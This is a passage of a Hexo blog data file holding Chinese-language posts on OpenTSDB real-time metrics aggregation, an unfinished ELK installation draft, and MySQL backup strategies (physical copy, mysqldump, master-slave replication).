&#x6211;&#x3002;</p>\n<p>(3)&#x3001;&#x5728;&#x4E1A;&#x52A1;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x7528;OpenTSDB&#x4E0E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;(storm)&#x7ED3;&#x5408;&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5E76;&#x5B58;&#x50A8;&#x5B9E;&#x65F6;metric&#x6570;&#x636E;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x5728;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7A97;&#x53E3;(window)&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x805A;&#x5408;&#x7ED3;&#x679C;&#x5199;&#x5165;tsdb&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;&#x5728;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#x5728;&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;&#x53EF;&#x80FD;&#x4F1A;&#x5B58;&#x5728;&#x5EF6;&#x65F6;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;tsdb&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x51C6;&#x786E;&#x3002;&#x9488;&#x5BF9;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x6539;&#x8FDB;&#xFF0C;&#x5728;&#x539F;&#x6709;tsdb&#x5199;&#x5165;api&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x52A0;&#x7684;api&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5EF6;&#x8FDF;&#x5230;&#x6765;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x53E0;&#x52A0;&#x5230;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x4E0A;&#xFF0C;&#x5B9E;&#x65F6;&#x7684;&#x51C6;&#x786E;&#x6027;&#x7531;&#x4E8E;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x539F;&#x56E0;(&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;)&#x4EA7;&#x751F;&#x4E86;&#x5EF6;&#x8FDF;&#xFF0C;&#x5230;&#x6700;&#x7EC8;&#x7684;&#x51C6;&#x786E;&#x6027;&#x4E5F;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4FDD;&#x8BC1;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x8FD9;&#x4E2A;&#x6539;&#x8FDB;&#x4E4B;&#x540E;&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x56E0;&#x4E3A;&#x8003;&#x8651;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#x8BBE;&#x7F6E;&#x5F97;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8FD9;&#x6837;&#x65E2;&#x8282;&#x7701;&#x4E86;&#x5185;&#x5B58;&#x7684;&#x6D88;&#x8017;&#xFF0C;&#x4E5F;&#x63D0;&#x9AD8;&#x4E86;&#x5B9E;&#x65F6;&#x6027;&#x3002;</p>\n<h2 id=\"&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\"><a href=\"#&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\" class=\"headerlink\" title=\"&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\"></a>&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;</h2><p>&#x6570;&#x636E;&#x5B58;&#x50A8;(&#x5206;&#x5E03;&#x5F0F;&#x5185;&#x5B58;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;(Tachyon)&#x3001;&#x6570;&#x636E;&#x591A;&#x4ECB;&#x8D28;&#x5206;&#x5C42;&#x5B58;&#x50A8;&#x3001;&#x6570;&#x636E;&#x5217;&#x5F0F;&#x5B58;&#x50A8;)&#x3001;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(OLAP)&#x3001;&#x8D44;&#x6E90;&#x9694;&#x79BB;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x3001;&#x5E73;&#x53F0;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x76D1;&#x63A7;&#x3001;&#x6570;&#x636E;&#x5BF9;&#x5916;&#x670D;&#x52A1;&#x7B49;&#x3002;</p>\n<p>&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;&#xFF1A;&#x738B;&#x52B2;&#xFF1A;&#x76EE;&#x524D;&#x5C31;&#x804C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#xFF0C;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x5E08;&#xFF0C;&#x8D1F;&#x8D23;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x89C4;&#x5212;&#x3001;&#x5EFA;&#x8BBE;&#x3001;&#x5E94;&#x7528;&#x3002; 11&#x5E74;&#x7684;IT&#x4ECE;&#x4E1A;&#x7ECF;&#x9A8C;&#xFF0C;2&#x5E74;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#xFF0C;3&#x5E74;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E3B;&#x8981;&#x7814;&#x7A76;&#x65B9;&#x5411;&#x6D41;&#x5F0F;&#x8BA1;&#x7B97;&#x3001;&#x5927;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3001;NoSQL&#x3001;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7B49;&#x3002;</p>"},{"title":"ELK安装","date":"2016-11-15T14:10:00.000Z","_content":"\n## ELK介绍\n日志主要包括系统日志、应用程序日志和安全日志。系统运维和开发人员可以通过日志了解服务器软硬件信息、检查配置过程中的错误及错误发生的原因。经常分析日志可以了解服务器的负荷，性能安全性，从而及时采取措施纠正错误。\n\n通常，日志被分散的储存不同的设备上。如果你管理数十上百台服务器，还使用依次登录每台机器的传统方法查阅日志，效率会十分其低下。开源实时日志分析ELK平台能够完美的解决上述问题。\n\nELK由ElasticSearch、Logstash和Kiabana三个开源工具组成：\n- Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。\n- Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。\n- Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。\n\n<!-- more -->\n\n## ELK安装\n### 安装jdk\n\n### 安装Elasticsearch\n### 安装Logstash\n### 安装Kibana\n\n## ELK相关链接\n","source":"_drafts/ELK安装.md","raw":"---\ntitle: ELK安装\ncategories:\n  - 运维部署\ntags:\n  - elk\ndate: 2016-11-15 22:10:00\n\n---\n\n## ELK介绍\n日志主要包括系统日志、应用程序日志和安全日志。系统运维和开发人员可以通过日志了解服务器软硬件信息、检查配置过程中的错误及错误发生的原因。经常分析日志可以了解服务器的负荷，性能安全性，从而及时采取措施纠正错误。\n\n通常，日志被分散的储存不同的设备上。如果你管理数十上百台服务器，还使用依次登录每台机器的传统方法查阅日志，效率会十分其低下。开源实时日志分析ELK平台能够完美的解决上述问题。\n\nELK由ElasticSearch、Logstash和Kiabana三个开源工具组成：\n- Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。\n- Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。\n- Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。\n\n<!-- more -->\n\n## ELK安装\n### 安装jdk\n\n### 安装Elasticsearch\n### 安装Logstash\n### 安装Kibana\n\n## ELK相关链接\n","slug":"ELK安装","published":0,"updated":"2016-11-21T03:57:10.570Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulf3005bgwtmao3wnu8q","content":"<h2 id=\"ELK&#x4ECB;&#x7ECD;\"><a href=\"#ELK&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"ELK&#x4ECB;&#x7ECD;\"></a>ELK&#x4ECB;&#x7ECD;</h2><p>&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65E5;&#x5FD7;&#x548C;&#x5B89;&#x5168;&#x65E5;&#x5FD7;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x548C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x65E5;&#x5FD7;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x8F6F;&#x786C;&#x4EF6;&#x4FE1;&#x606F;&#x3001;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x9519;&#x8BEF;&#x53CA;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x539F;&#x56E0;&#x3002;&#x7ECF;&#x5E38;&#x5206;&#x6790;&#x65E5;&#x5FD7;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8377;&#xFF0C;&#x6027;&#x80FD;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4ECE;&#x800C;&#x53CA;&#x65F6;&#x91C7;&#x53D6;&#x63AA;&#x65BD;&#x7EA0;&#x6B63;&#x9519;&#x8BEF;&#x3002;</p>\n<p>&#x901A;&#x5E38;&#xFF0C;&#x65E5;&#x5FD7;&#x88AB;&#x5206;&#x6563;&#x7684;&#x50A8;&#x5B58;&#x4E0D;&#x540C;&#x7684;&#x8BBE;&#x5907;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x4F60;&#x7BA1;&#x7406;&#x6570;&#x5341;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4F9D;&#x6B21;&#x767B;&#x5F55;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x7684;&#x4F20;&#x7EDF;&#x65B9;&#x6CD5;&#x67E5;&#x9605;&#x65E5;&#x5FD7;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x5341;&#x5206;&#x5176;&#x4F4E;&#x4E0B;&#x3002;&#x5F00;&#x6E90;&#x5B9E;&#x65F6;&#x65E5;&#x5FD7;&#x5206;&#x6790;ELK&#x5E73;&#x53F0;&#x80FD;&#x591F;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#x3002;</p>\n<p>ELK&#x7531;ElasticSearch&#x3001;Logstash&#x548C;Kiabana&#x4E09;&#x4E2A;&#x5F00;&#x6E90;&#x5DE5;&#x5177;&#x7EC4;&#x6210;&#xFF1A;</p>\n<ul>\n<li>Elasticsearch&#x662F;&#x4E2A;&#x5F00;&#x6E90;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x5B83;&#x7684;&#x7279;&#x70B9;&#x6709;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x96F6;&#x914D;&#x7F6E;&#xFF0C;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x7D22;&#x5F15;&#x81EA;&#x52A8;&#x5206;&#x7247;&#xFF0C;&#x7D22;&#x5F15;&#x526F;&#x672C;&#x673A;&#x5236;&#xFF0C;restful&#x98CE;&#x683C;&#x63A5;&#x53E3;&#xFF0C;&#x591A;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x81EA;&#x52A8;&#x641C;&#x7D22;&#x8D1F;&#x8F7D;&#x7B49;&#x3002;</li>\n<li>Logstash&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x5BF9;&#x4F60;&#x7684;&#x65E5;&#x5FD7;&#x8FDB;&#x884C;&#x6536;&#x96C6;&#x3001;&#x8FC7;&#x6EE4;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x4F9B;&#x4EE5;&#x540E;&#x4F7F;&#x7528;&#xFF08;&#x5982;&#xFF0C;&#x641C;&#x7D22;&#xFF09;&#x3002;</li>\n<li>Kibana &#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x548C;&#x514D;&#x8D39;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;Kibana&#x53EF;&#x4EE5;&#x4E3A; Logstash &#x548C; ElasticSearch &#x63D0;&#x4F9B;&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x53CB;&#x597D;&#x7684; Web &#x754C;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x60A8;&#x6C47;&#x603B;&#x3001;&#x5206;&#x6790;&#x548C;&#x641C;&#x7D22;&#x91CD;&#x8981;&#x6570;&#x636E;&#x65E5;&#x5FD7;&#x3002;</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"ELK&#x5B89;&#x88C5;\"><a href=\"#ELK&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"ELK&#x5B89;&#x88C5;\"></a>ELK&#x5B89;&#x88C5;</h2><h3 id=\"&#x5B89;&#x88C5;jdk\"><a href=\"#&#x5B89;&#x88C5;jdk\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;jdk\"></a>&#x5B89;&#x88C5;jdk</h3><h3 id=\"&#x5B89;&#x88C5;Elasticsearch\"><a href=\"#&#x5B89;&#x88C5;Elasticsearch\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Elasticsearch\"></a>&#x5B89;&#x88C5;Elasticsearch</h3><h3 id=\"&#x5B89;&#x88C5;Logstash\"><a href=\"#&#x5B89;&#x88C5;Logstash\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Logstash\"></a>&#x5B89;&#x88C5;Logstash</h3><h3 id=\"&#x5B89;&#x88C5;Kibana\"><a href=\"#&#x5B89;&#x88C5;Kibana\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Kibana\"></a>&#x5B89;&#x88C5;Kibana</h3><h2 id=\"ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;</h2>","excerpt":"<h2 id=\"ELK&#x4ECB;&#x7ECD;\"><a href=\"#ELK&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"ELK&#x4ECB;&#x7ECD;\"></a>ELK&#x4ECB;&#x7ECD;</h2><p>&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65E5;&#x5FD7;&#x548C;&#x5B89;&#x5168;&#x65E5;&#x5FD7;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x548C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x65E5;&#x5FD7;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x8F6F;&#x786C;&#x4EF6;&#x4FE1;&#x606F;&#x3001;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x9519;&#x8BEF;&#x53CA;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x539F;&#x56E0;&#x3002;&#x7ECF;&#x5E38;&#x5206;&#x6790;&#x65E5;&#x5FD7;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x8377;&#xFF0C;&#x6027;&#x80FD;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4ECE;&#x800C;&#x53CA;&#x65F6;&#x91C7;&#x53D6;&#x63AA;&#x65BD;&#x7EA0;&#x6B63;&#x9519;&#x8BEF;&#x3002;</p>\n<p>&#x901A;&#x5E38;&#xFF0C;&#x65E5;&#x5FD7;&#x88AB;&#x5206;&#x6563;&#x7684;&#x50A8;&#x5B58;&#x4E0D;&#x540C;&#x7684;&#x8BBE;&#x5907;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x4F60;&#x7BA1;&#x7406;&#x6570;&#x5341;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4F9D;&#x6B21;&#x767B;&#x5F55;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x7684;&#x4F20;&#x7EDF;&#x65B9;&#x6CD5;&#x67E5;&#x9605;&#x65E5;&#x5FD7;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x5341;&#x5206;&#x5176;&#x4F4E;&#x4E0B;&#x3002;&#x5F00;&#x6E90;&#x5B9E;&#x65F6;&#x65E5;&#x5FD7;&#x5206;&#x6790;ELK&#x5E73;&#x53F0;&#x80FD;&#x591F;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#x3002;</p>\n<p>ELK&#x7531;ElasticSearch&#x3001;Logstash&#x548C;Kiabana&#x4E09;&#x4E2A;&#x5F00;&#x6E90;&#x5DE5;&#x5177;&#x7EC4;&#x6210;&#xFF1A;</p>\n<ul>\n<li>Elasticsearch&#x662F;&#x4E2A;&#x5F00;&#x6E90;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x5B83;&#x7684;&#x7279;&#x70B9;&#x6709;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x96F6;&#x914D;&#x7F6E;&#xFF0C;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x7D22;&#x5F15;&#x81EA;&#x52A8;&#x5206;&#x7247;&#xFF0C;&#x7D22;&#x5F15;&#x526F;&#x672C;&#x673A;&#x5236;&#xFF0C;restful&#x98CE;&#x683C;&#x63A5;&#x53E3;&#xFF0C;&#x591A;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x81EA;&#x52A8;&#x641C;&#x7D22;&#x8D1F;&#x8F7D;&#x7B49;&#x3002;</li>\n<li>Logstash&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x5F00;&#x6E90;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x5BF9;&#x4F60;&#x7684;&#x65E5;&#x5FD7;&#x8FDB;&#x884C;&#x6536;&#x96C6;&#x3001;&#x8FC7;&#x6EE4;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x4F9B;&#x4EE5;&#x540E;&#x4F7F;&#x7528;&#xFF08;&#x5982;&#xFF0C;&#x641C;&#x7D22;&#xFF09;&#x3002;</li>\n<li>Kibana &#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x548C;&#x514D;&#x8D39;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;Kibana&#x53EF;&#x4EE5;&#x4E3A; Logstash &#x548C; ElasticSearch &#x63D0;&#x4F9B;&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x53CB;&#x597D;&#x7684; Web &#x754C;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x60A8;&#x6C47;&#x603B;&#x3001;&#x5206;&#x6790;&#x548C;&#x641C;&#x7D22;&#x91CD;&#x8981;&#x6570;&#x636E;&#x65E5;&#x5FD7;&#x3002;</li>\n</ul>","more":"<h2 id=\"ELK&#x5B89;&#x88C5;\"><a href=\"#ELK&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"ELK&#x5B89;&#x88C5;\"></a>ELK&#x5B89;&#x88C5;</h2><h3 id=\"&#x5B89;&#x88C5;jdk\"><a href=\"#&#x5B89;&#x88C5;jdk\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;jdk\"></a>&#x5B89;&#x88C5;jdk</h3><h3 id=\"&#x5B89;&#x88C5;Elasticsearch\"><a href=\"#&#x5B89;&#x88C5;Elasticsearch\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Elasticsearch\"></a>&#x5B89;&#x88C5;Elasticsearch</h3><h3 id=\"&#x5B89;&#x88C5;Logstash\"><a href=\"#&#x5B89;&#x88C5;Logstash\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Logstash\"></a>&#x5B89;&#x88C5;Logstash</h3><h3 id=\"&#x5B89;&#x88C5;Kibana\"><a href=\"#&#x5B89;&#x88C5;Kibana\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;Kibana\"></a>&#x5B89;&#x88C5;Kibana</h3><h2 id=\"ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>ELK&#x76F8;&#x5173;&#x94FE;&#x63A5;</h2>"},{"title":"MySQL备份策略","date":"2016-10-21T13:18:00.000Z","_content":"\n### 常见备份策略\n**物理备份**：直接拷贝数据库文件\n**逻辑备份**：使用 mysqlhotcopy / mysqldump 备份数据库\n**双机热备**：使用主从复制机制(实现数据库实时备份）\n\n### 物理备份\n\n直接拷贝只适用于myisam类型的表。这种类型的表是与机器独立的。但实际情况是，你设计数据库的时候不可能全部使用myisam类型表。你也不可能：因为myisam类型表与机器独立，方便移植，于是就选择这种表，这并不是选择它的理由。\n\n缺点：你不能去操作正在运行的mysql服务器(在拷贝的过程中有用户通过应用程序访问更新数据，这样就无法备份当时的数据)可能无法移植到其他机器上去。\n\n更多的情况是，你会根据业务特点(比如你需要支持事务机制就必须使用innodb)，查询速度和服务性能来选择表类型的。\n\n**必须保证表不被使用中。**\n如果服务器在你正在拷贝一个表时(某个用户在进行update、insert操作)改变它，拷贝的数据就失去了备份的意义(没法准确还原到当时的点)。\n\n如果数据库表在文件系统备份过程中被修改，进入备份的表文件主语不一致的状态，而对以后的恢复表将失去意义。\n\n保证你的拷贝完整性的最好方法是：关闭服务器，拷贝文件，然后重启服务器。\n或者是，要锁定对应的表(对前端用户造成访问问题)。\n\n\n**解释直接拷贝文件，为什么不具备可移植性？**\n\nmysqldump 产生可移植到其他机器、甚至具有不同硬件结构的机器上的文本文件。直接拷贝文件不能够移植到其他机器上，除非要拷贝的表使用MyISAM 存储格式。ISAM 表只能在具有相同硬件结构的机器之间进行拷贝。例如，将文件从S PARC 的Solaris 机器拷贝到Intel 的Solaris 机器（或者相反）是行不通的。由MySQL3.23 引进的MyISAM 表存储格式可以解决这个问题，因为该格式与机器独立。因此，如果以下两个条件都满足的话，直接拷贝文件可以移植到具有不同硬件结构的机器上：即另一台机器上也必须运行MySQL3.23 以上的版本，并且文件必须表示成MyISAM 表，而不是ISAM 表。\n\n\n### 逻辑备份\n使用mysql自带的mysqldump工具进行备份。备份成sql文件形式。\n优点：最大好处是能够与正在运行的mysql自动协同工作，\n在运行期间可以确保备份是当时的点，它会自动将对应操作的表锁定，不允许其他用户修改(只能访问)。可能会阻止修改操作。sql文件通用方便移植。\n\n缺点：备份的速度比较慢。如果是数据量很多的时候。就很耗时间。如果数据库服务器处在提供给用户服务状态，在这段长时间操作过程中，意味着要锁定表(一般是读锁定，只能读不能写入数据)。那么服务就会影响的。\n\n\n备注：所谓的与mysql服务器能够自动协同工作，实际上是指加参数来控制mysql服务器，比如锁定所有表只能进行读，不能进行写操作。\n\n--lock-all-tables\n\n\n### 双机热备份\n\nmysql数据库没有增量备份的机制。当数据量太大的时候备份是一个很大的问题。还好mysql数据库提供了一种主从备份的机制(也就是双机热备)\n优点：适合数据量大的时候。现在明白了。大的互联网公司对于mysql数据备份，都是采用热机备份。搭建多台数据库服务器，进行主从复制。\n\n主从复制经常遇到的问题就是，如何保证数据不堵塞，不延迟。这个问题还是可以容忍的，有一些方案可以改善。毕竟有得有失的。这已经是很省心省力的方式了。\n\n\n================================================\n\n我目前应该使用什么样的备份策略的权衡：\n\n物理备份，恢复快，当然最好是存储在一个机器上。我现在是用物理备份还是逻辑备份为好呢？\n考虑到以后会迁移平台。为了保证通用性。恢复速度1分钟左右的差距我是可以容忍的(sql文件备份方式，恢复速度没有物理配备快，物理备份直接拷贝覆盖掉原来文件即可)。所以我为了跨平台，我更加愿意使用逻辑备份。存储sql文件形式。\n\n双热机备份方式，目前硬件没有多个。技术人员有限，需要人力去维护，比较麻烦。所以排除在外。","source":"_drafts/MySQL备份策略.md","raw":"---\ntitle: MySQL备份策略\ncategories:\n  - 部署配置\ntags:\n  - mysql\ndate: 2016-10-21 21:18:00\n---\n\n### 常见备份策略\n**物理备份**：直接拷贝数据库文件\n**逻辑备份**：使用 mysqlhotcopy / mysqldump 备份数据库\n**双机热备**：使用主从复制机制(实现数据库实时备份）\n\n### 物理备份\n\n直接拷贝只适用于myisam类型的表。这种类型的表是与机器独立的。但实际情况是，你设计数据库的时候不可能全部使用myisam类型表。你也不可能：因为myisam类型表与机器独立，方便移植，于是就选择这种表，这并不是选择它的理由。\n\n缺点：你不能去操作正在运行的mysql服务器(在拷贝的过程中有用户通过应用程序访问更新数据，这样就无法备份当时的数据)可能无法移植到其他机器上去。\n\n更多的情况是，你会根据业务特点(比如你需要支持事务机制就必须使用innodb)，查询速度和服务性能来选择表类型的。\n\n**必须保证表不被使用中。**\n如果服务器在你正在拷贝一个表时(某个用户在进行update、insert操作)改变它，拷贝的数据就失去了备份的意义(没法准确还原到当时的点)。\n\n如果数据库表在文件系统备份过程中被修改，进入备份的表文件主语不一致的状态，而对以后的恢复表将失去意义。\n\n保证你的拷贝完整性的最好方法是：关闭服务器，拷贝文件，然后重启服务器。\n或者是，要锁定对应的表(对前端用户造成访问问题)。\n\n\n**解释直接拷贝文件，为什么不具备可移植性？**\n\nmysqldump 产生可移植到其他机器、甚至具有不同硬件结构的机器上的文本文件。直接拷贝文件不能够移植到其他机器上，除非要拷贝的表使用MyISAM 存储格式。ISAM 表只能在具有相同硬件结构的机器之间进行拷贝。例如，将文件从S PARC 的Solaris 机器拷贝到Intel 的Solaris 机器（或者相反）是行不通的。由MySQL3.23 引进的MyISAM 表存储格式可以解决这个问题，因为该格式与机器独立。因此，如果以下两个条件都满足的话，直接拷贝文件可以移植到具有不同硬件结构的机器上：即另一台机器上也必须运行MySQL3.23 以上的版本，并且文件必须表示成MyISAM 表，而不是ISAM 表。\n\n\n### 逻辑备份\n使用mysql自带的mysqldump工具进行备份。备份成sql文件形式。\n优点：最大好处是能够与正在运行的mysql自动协同工作，\n在运行期间可以确保备份是当时的点，它会自动将对应操作的表锁定，不允许其他用户修改(只能访问)。可能会阻止修改操作。sql文件通用方便移植。\n\n缺点：备份的速度比较慢。如果是数据量很多的时候。就很耗时间。如果数据库服务器处在提供给用户服务状态，在这段长时间操作过程中，意味着要锁定表(一般是读锁定，只能读不能写入数据)。那么服务就会影响的。\n\n\n备注：所谓的与mysql服务器能够自动协同工作，实际上是指加参数来控制mysql服务器，比如锁定所有表只能进行读，不能进行写操作。\n\n--lock-all-tables\n\n\n### 